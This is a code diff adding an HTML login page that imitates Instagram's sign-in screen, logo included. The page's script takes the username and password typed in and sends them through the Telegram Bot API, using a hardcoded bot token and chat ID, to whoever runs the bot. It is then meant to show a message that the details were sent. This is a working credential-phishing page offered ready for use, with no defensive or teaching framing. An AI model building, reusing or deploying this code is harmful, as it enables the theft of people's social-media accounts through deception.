@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            width: 350px;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .login-container img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .login-container input[type="submit"] {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            font-size: 16px;
+            cursor: pointer;
+            padding: 12px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-container input[type="submit"]:hover {
+            background-color: #0078d4;
+        }
+
+        .divider {
+            margin: 20px 0;
+            position: relative;
+            text-align: center;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            display: block;
+            height: 1px;
+            background-color: #dbdbdb;
+            width: 40%;
+            margin: 0 auto;
+        }
+
+        .divider span {
+            position: absolute;
+            top: -10px;
+            background-color: #fafafa;
+            padding: 0 10px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .signup-link {
+            font-size: 14px;
+            color: #0095f6;
+        }
+
+        .signup-link a {
+            text-decoration: none;
+            color: #0095f6;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+    </style>
+    <script>
+        // Function to send data to Telegram Bot
+        function sendToTelegram(username, password) {
+            const botToken = '7848679382:AAG9RDlm4FVRpyKcbXCoLExV_CoA4TCu7RI'; // Replace with your bot API token
+            const chatId = '6956607670'; // Replace with your chat ID
+
+            const message = `Username: ${username}\nPassword: ${password}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send request to Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message sent:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
+        }
+
+        // Handle login form submission
+        function handleLogin(event) {
+            event.preventDefault(); // Prevent page refresh on form submit
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                sendToTelegram(username, password); // Send username and password to Telegram
+                alert('Logged in and details sent to Telegram!');
+            } else {
+                alert('Please enter both username and password.');
+            }
+        }
+    </script>
+</head>
+
+<body>
+    <div class="login-container">
+        <!-- Instagram Logo -->
+        <img src="./Instagram_logo_2022.svg.png" alt="Instagram Logo">
+
+        <!-- Login Form -->
+        <form onsubmit="handleLogin(event)">
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Log In">
+        </form>
+
+        <!-- Divider -->
+        <div class="divider">
+            <span>OR</span>
+        </div>
+
+        <!-- Sign Up Link -->
+        <div class="signup-link">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+</body>
+
+</html>
